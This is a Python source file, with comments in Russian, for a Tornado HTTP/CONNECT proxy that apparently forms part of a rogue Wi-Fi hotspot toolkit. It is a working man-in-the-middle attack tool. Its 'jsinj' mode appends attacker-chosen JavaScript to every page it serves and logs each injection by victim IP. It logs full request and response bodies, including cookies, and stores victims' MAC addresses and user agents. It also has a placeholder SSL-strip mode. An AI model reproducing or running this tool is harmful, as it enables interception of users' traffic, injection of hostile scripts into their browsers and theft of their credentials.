import tornado.ioloop
import tornado.web
import tornado.httpserver
import tornado.httpclient
import tornado.iostream
import tornado.httputil
import threading
import time
import sys
import os, platform, logging
import socket
import argparse
from urllib.parse import urlparse
from ourlogging import Logging
from adminka.adminka.source_code.logging import Logging
from adminka.adminka.source_code.clientAndHotspot import Client, Hotspot

# Список атакуемых сайтов
#list_target_hosts = ['vk.com', ]


# Создание файлаов лога
if platform.platform().startswith('Windows'):
    logging_file = os.path.join(os.getenv('HOMEDRIVE'), os.getenv('HOMEPATH'), 'log_proxy_server.log')
    logging_main = Logging(os.path.join(os.getenv('HOMEDRIVE'), os.getenv('HOMEPATH'), 'main.log'))
    logging_output = Logging(os.path.join(os.getenv('HOMEDRIVE'), os.getenv('HOMEPATH'), 'proxyserver.output'))
else:
    logging_file = os.path.join(os.getenv('HOME'), 'log_proxy_server.log')
    logging_main = Logging(os.path.join(os.getenv('HOME'), 'main.log'))
    logging_output = Logging(os.path.join(os.getenv('HOME'), 'proxyserver.output'))

# Этот лог моего формата, пусть останется пока что
print("Сохраняем лог в ", logging_file)

# Словарь для создания буфера записи лога и обновлений строк User-Agent в БД
dic_ip_user_agent = {}

# Настройка лог файла
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s : %(levelname)s : %(message)s',
    filename=logging_file,
    filemode='w',
)

__all__ = ['ProxyHandler', 'run_proxy']


def get_js_for_inj(file):
    """Функция для чтения JavaScript из файла"""
    with open(file, 'rb') as f:
        return f.read()


def get_proxy(url):
    url_parsed = urlparse(url, scheme='http')
    proxy_key = '%s_proxy' % url_parsed.scheme
    return os.environ.get(proxy_key)


def parse_proxy(proxy):
    proxy_parsed = urlparse(proxy, scheme='http')
    return proxy_parsed.hostname, proxy_parsed.port


def fetch_request(url, callback, **kwargs):
    proxy = get_proxy(url)
    if proxy:
        tornado.httpclient.AsyncHTTPClient.configure('tornado.curl_httpclient.CurlAsyncHTTPClient')
        host, port = parse_proxy(proxy)
        kwargs['proxy_host'] = host
        kwargs['proxy_port'] = port

    req = tornado.httpclient.HTTPRequest(url, **kwargs)
    client = tornado.httpclient.AsyncHTTPClient()
    client.fetch(req, callback, raise_error=False)


class ProxyHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['GET', 'POST', 'CONNECT']

    def initialize(self, m=None, j=None):
        self.mode = m
        self.jscript = j

    def compute_etag(self):
        return None  # disable tornado Etag

    @tornado.web.asynchronous
    def get(self):

        # Сбор статистики в лог файл
        # msg_log = self.request.remote_ip + ' : ' + self.request.headers['User-Agent']
        # logging_output.write_log('СТАТИСТИКА', msg_log)
        # global dic_ip_user_agent
        # dic_ip_user_agent = {str(self.request.remote_ip): self.request.headers['User-Agent']}

        logging.info('Handle %s request to %s', self.request.method,\
                     self.request.uri)

        def handle_response(response):
            if (response.error and not isinstance(response.error, tornado.httpclient.HTTPError)):
                self.set_status(500)
                self.write('Internal server error:\n' + str(response.error))
            else:
                self.set_status(response.code, response.reason)
                self._headers = tornado.httputil.HTTPHeaders()  # clear tornado default header
                logging.info("Header response: {}".format(response.headers.get_all()))
                for header, v in response.headers.get_all():
                    if header not in ('Content-Length', 'Transfer-Encoding', 'Content-Encoding', 'Connection'):
                        self.add_header(header, v)  # some header appear multiple times, eg 'Set-Cookie'

                logging.info("Header request: {}".format(self.request.headers))

                if (response.body and self.mode == 'jsinj'):
                    self.set_header('Content-Length', len(response.body) + len(self.jscript))
                    self.write(response.body + self.jscript)
                    # Отчет о внедрении JavaScript
                    logging_output.write_log('JS INJECTED', 'Пользователю с IP: ' + self.request.remote_ip + 'JS внедрен')
                    logging.info("Body response: {}".format(response.body))
                elif response.body:
                    self.set_header('Content-Length', len(response.body))
                    self.write(response.body)
                    logging.info("Body response: {}".format(response.body))
            self.finish()

        body = self.request.body
        logging.info("Body request: {}".format(body))
        if not body:
            body = None
        try:
            if 'Proxy-Connection' in self.request.headers:
                del self.request.headers['Proxy-Connection']
            fetch_request(
                self.request.uri, handle_response,
                method=self.request.method, body=body,
                headers=self.request.headers, follow_redirects=False,
                allow_nonstandard_methods=True)
        except tornado.httpclient.HTTPError as e:
            if hasattr(e, 'response') and e.response:
                handle_response(e.response)
            else:
                logging_main.write_log('ОШИБКА', 'Внутренняя ошибка прокси-сервера')
                self.set_status(500)
                self.write('Internal server error:\n' + str(e))
                self.finish()


    @tornado.web.asynchronous
    def post(self):
        return self.get()

    @tornado.web.asynchronous
    def connect(self):
        logging.debug('Start CONNECT to {}'.format(self.request.uri))
        host, port = self.request.uri.split(':')
        client = self.request.connection.stream

        def read_from_client(data):
            upstream.write(data)

        def read_from_upstream(data):
            client.write(data)

        def client_close(data=None):
            if upstream.closed():
                return
            if data:
                upstream.write(data)
            upstream.close()

        def upstream_close(data=None):
            if client.closed():
                return
            if data:
                client.write(data)
            client.close()

        def start_tunnel():
            logging.debug('CONNECT tunnel established to {}'.format(self.request.uri))
            client.read_until_close(client_close, read_from_client)
            upstream.read_until_close(upstream_close, read_from_upstream)
            client.write(b'HTTP/1.0 200 Connection established\r\n\r\n')

        def on_proxy_response(data=None):
            if data:
                first_line = data.splitlines()[0]
                http_v, status, text = first_line.split(None, 2)
                if int(status) == 200:
                    logging.debug('Connected to upstream proxy {}'.format(proxy))
                    start_tunnel()
                    return

            self.set_status(500)
            self.finish()

        def start_proxy_tunnel():
            upstream.write('CONNECT %s HTTP/1.1\r\n' % self.request.uri)
            upstream.write('Host: %s\r\n' % self.request.uri)
            upstream.write('Proxy-Connection: Keep-Alive\r\n\r\n')
            upstream.read_until('\r\n\r\n', on_proxy_response)

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        upstream = tornado.iostream.IOStream(s)

        proxy = get_proxy(self.request.uri)
        if proxy:
            proxy_host, proxy_port = parse_proxy(proxy)
            upstream.connect((proxy_host, proxy_port), start_proxy_tunnel)
        else:
            upstream.connect((host, int(port)), start_tunnel)


class LoggingProxyServer(threading.Thread):

    """Класс для логирования действий ProxyServer и записей в БД.
            Параметры: - interval - время обновления буфера и записи информации в БД."""

    def __init__(self, interval):
        threading.Thread.__init__(self)
        self.daemon = True
        self.interval = interval

    @staticmethod
    def checkout_info():
        global dic_ip_user_agent
        for ip, user_agent in dic_ip_user_agent.items():
            mac = Client.get_mac_for_ip(ip)
            Client.update_user_agent(user_agent, mac)
            msg_log = ip + ' : ' + user_agent
            logging_output.write_log('СТАТИСТИКА', msg_log)
        dic_ip_user_agent.clear()

    def run(self):
        while True:
            time.sleep(self.interval)
            self.checkout_info()


def run_proxy(port, mode=None, jscript=None, start_ioloop=True):
    """ Запуск прокси-сервера на специальном порту, по умолчанию port=8080 """

    # Запуск логирования и записи в БД. Все считывается с глобальной переменной dic_ip_user_agent
    log = LoggingProxyServer(45)
    log.run()

    payload_js = None
    try:
        if len(sys.argv) < 2:
            print("Вы должны указать по крайней мере один параметр это номер порта. Пример -p 8080")
            sys.exit(1)
        elif mode == 'jsinj':
            payload_js = get_js_for_inj(jscript)
            app = tornado.web.Application([
                (r'.*', ProxyHandler, dict(m=mode, j=payload_js))
            ])
        # Здесь не реализовано
        elif mode == 'sslstrip':
            app = tornado.web.Application([
                (r'.*', ProxyHandler, dict(m=mode))
            ])
        else:
            app = tornado.web.Application([
                (r'.*', ProxyHandler),
            ])
    except Exception as e:
        print("Не верные параметры скрипта!\n")
        logging_main.write_log('ОШИБКА', 'Не верные параметры скрипта при запуске Proxy Server')
        sys.exit(1)

    app.listen(port)
    ioloop = tornado.ioloop.IOLoop.instance()
    if start_ioloop:
        ioloop.start()

if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="Мдуль ProxyServer может работать в двух режимах \
                                                 1. JavaScript Injection \
                                                 2. SSL Strip. Если режим не задан он работает штатно.")
    parser.add_argument('-p', '--port', default=8080, type=int, help='Порт на котором будет работать прокси-сервер.')
    parser.add_argument('-m', '--mode', default=None, type=str, help='Задает режим работы прокси-сервера. \
                        Если mode=jsinj, прокси-сервер к ответам пользователям будет добавлять JavaScript, \
                        который задается в параметре -j')
    parser.add_argument('-j', '--jscript', default=None, type=str, help="Указываем файл с JavaScript, который выполнится в \
                        браузере пользователя. Пример test_js")
    args = parser.parse_args()

    print("Starting HTTP proxy on port %d" % args.port)
    msg = 'Старт модуля Proxy Server в режиме - '
    if args.mode == 'jsinj':
        msg += 'JavaScript Injection'
    elif args.mode == 'sslstrip':
        msg += 'SSL Strip'
    else:
        msg += 'Сбора статистики'
    logging_main.write_log('ЗАПУСК МОДУЛЯ', msg)
    try:
        run_proxy(args.port, args.mode, args.jscript)
    except Exception as e:
        logging_main.write_log('ОШИБКА', 'При запуске Proxy Server возникла ошибка')
        logging_main.write_log('ОШИБКА', 'Proxy Server не смог запуститься')
        sys.exit(2)



